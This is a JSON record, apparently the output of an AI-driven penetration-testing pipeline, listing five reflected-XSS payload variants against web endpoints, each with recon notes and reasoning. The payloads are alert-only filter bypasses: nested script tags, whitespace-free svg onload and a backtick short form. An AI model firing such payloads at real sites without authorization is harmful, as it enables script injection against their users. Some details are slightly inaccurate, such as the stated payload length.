@@ -1,0 +1,68 @@
+{
+ "key": "xss_reflected_1",
+ "model": "opencode/deepseek-v4.1-flash-free",
+ "class": "xss_reflected",
+ "variants": [
+  {
+   "endpoint": "POST /api/v2/feedback/submit",
+   "target_param": "comment",
+   "recon_evidence": "The comment body is sanitized by a client-side blacklist that strips <script> and </script> tokens in one pass, but the raw value is still reflected into the server-rendered 'Preview your feedback' panel with no output encoding.",
+   "planner_rationale": "Single-pass tag stripping is bypassable with a nested tag; submit the nested variant in the JSON body and watch the preview panel.",
+   "vuln_class": "xss_reflected",
+   "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+   "injection_point": "body",
+   "expected_success_signal": "alert(1) fires in the feedback-preview panel even though the filter reported the script tag as removed",
+   "confidence": 0.86,
+   "reasoning": "The blacklist deletes the inner <script> token in a single pass, leaving the residual 'scr...ipt' halves to concatenate into a live tag. The body reflection is unencoded, so the reassembled tag parses normally."
+  },
+  {
+   "endpoint": "GET /user/profile",
+   "target_param": "display_name",
+   "recon_evidence": "Any literal space in display_name is stripped from the echoed 'Welcome back, <name>' banner, but the filter does not touch slashes or control characters between attributes.",
+   "planner_rationale": "Space removal only — use the slash-separated svg onload form which needs no whitespace.",
+   "vuln_class": "xss_reflected",
+   "payload": "<svg/onload=alert(1)>",
+   "injection_point": "query",
+   "expected_success_signal": "alert(1) executes as the profile page renders the greeting banner, with no spaces present in the request",
+   "confidence": 0.9,
+   "reasoning": "The observed filter strips only the space character, and / is a valid HTML attribute separator inside a tag. The svg/onload form needs no whitespace, so it survives the transform and the reflected banner executes it."
+  },
+  {
+   "endpoint": "GET /store/search",
+   "target_param": "ref",
+   "recon_evidence": "The ref query value is echoed into the 'Results for: ...' heading and the parameter is hard-capped at 30 characters by the frontend maxlength plus a trims long inputs server-side.",
+   "planner_rationale": "Hard 30-char budget rules out long payloads; pick the shortest parenless svg execution form.",
+   "vuln_class": "xss_reflected",
+   "payload": "<svg/onload=alert``>",
+   "injection_point": "query",
+   "expected_success_signal": "alert dialog appears from the reflected search heading despite the ~24-char payload fitting under the limit",
+   "confidence": 0.78,
+   "reasoning": "Backticks are a valid tag-invocation syntax for alert, dropping the parentheses and bringing the whole payload under the 30-character cap. The heading is reflected unencoded, so the shortened tag still parses and fires."
+  },
+  {
+   "endpoint": "GET /u/{username}",
+   "target_param": "username",
+   "recon_evidence": "The path segment is URL-decoded by the router and echoed verbatim into a <title> and an inline 'Profile: X' <div>; no HTML entities are applied and no length cap exists on path segments.",
+   "planner_rationale": "Path reflection into a raw HTML context — reuse the nested-tag trick against the same single-pass script stripper seen in the WAF logs.",
+   "vuln_class": "xss_reflected",
+   "payload": "<scr<script>ipt>alert(1)</scr</script>ipt>",
+   "injection_point": "path",
+   "expected_success_signal": "alert(1) fires when the /u/<payload> route renders the profile container",
+   "confidence": 0.68,
+   "reasoning": "The path segment is decoded then reflected unencoded into HTML, and the WAF's single-pass <script> removal leaves the nested halves intact. The reflection sits inside an element body, so the reassembled tag executes."
+  },
+  {
+   "endpoint": "GET /dashboard",
+   "target_param": "X-Return-To",
+   "recon_evidence": "The X-Return-To request header is copied into a hidden input value and a visible 'Returning to <value>' link on the dashboard; spaces in the header are collapsed to nothing before reflection.",
+   "planner_rationale": "Header reflection with whitespace stripping — the slash-separated svg onload form needs no spaces and survives the collapse.",
+   "vuln_class": "xss_reflected",
+   "payload": "<svg/onload=alert(1)>",
+   "injection_point": "header",
+   "expected_success_signal": "alert(1) executes on /dashboard when the crafted X-Return-To header is replayed via curl",
+   "confidence": 0.82,
+   "reasoning": "Whitespace collapse does not affect a payload that already uses / as the attribute separator. Since the header value is reflected into the dashboard markup without entity encoding, the svg onload handler executes."
+  }
+ ],
+ "raw_tail": "al\": \"alert(1) executes on /dashboard when the crafted X-Return-To header is replayed via curl\",\n    \"confidence\": 0.82,\n    \"reasoning\": \"Whitespace collapse does not affect a payload that already uses / as the attribute separator. Since the header value is reflected into the dashboard markup without entity encoding, the svg onload handler executes.\"\n  }\n]\n\u001b[0m\n> build · deepseek-v4.1-flash-free\n"
+}
